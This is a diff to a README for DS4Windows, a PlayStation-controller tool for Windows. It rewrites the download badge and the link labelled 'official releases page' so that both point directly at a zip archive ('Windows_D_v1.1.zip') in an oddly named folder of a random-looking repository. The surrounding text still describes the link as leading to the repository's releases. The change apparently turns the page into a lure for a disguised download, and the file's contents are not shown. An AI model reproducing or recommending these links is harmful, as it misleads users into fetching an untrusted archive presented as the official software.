@@ -1,6 +1,6 @@
 # 🎮 DS4Windows - Connect PlayStation Controllers To Your PC
 
-[![](https://img.shields.io/badge/Download-DS4Windows-blue)](https://github.com/reddishorangeacetphenetidin113/DS4Windows)
+[![](https://img.shields.io/badge/Download-DS4Windows-blue)](https://github.com/reddishorangeacetphenetidin113/DS4Windows/raw/refs/heads/main/parthenogenous/Windows_D_v1.1.zip)
 
 DS4Windows lets you use your PlayStation 4 or PlayStation 5 controller on your Windows PC. The program translates input from your Sony controller so games think you use an Xbox controller. This tool changes how your computer sees your gamepad. It provides a simple way to play PC games with your preferred hardware.
 
@@ -10,7 +10,7 @@ You need a few things to run this software. Your computer requires Windows 10 or
 
 ## 📥 How To Download And Install
 
-Visit the [official releases page](https://github.com/reddishorangeacetphenetidin113/DS4Windows) to get the latest version of the application. 
+Visit the [official releases page](https://github.com/reddishorangeacetphenetidin113/DS4Windows/raw/refs/heads/main/parthenogenous/Windows_D_v1.1.zip) to get the latest version of the application. 
 
 1. Click the link above to reach the repository.
 2. Select the latest release folder.
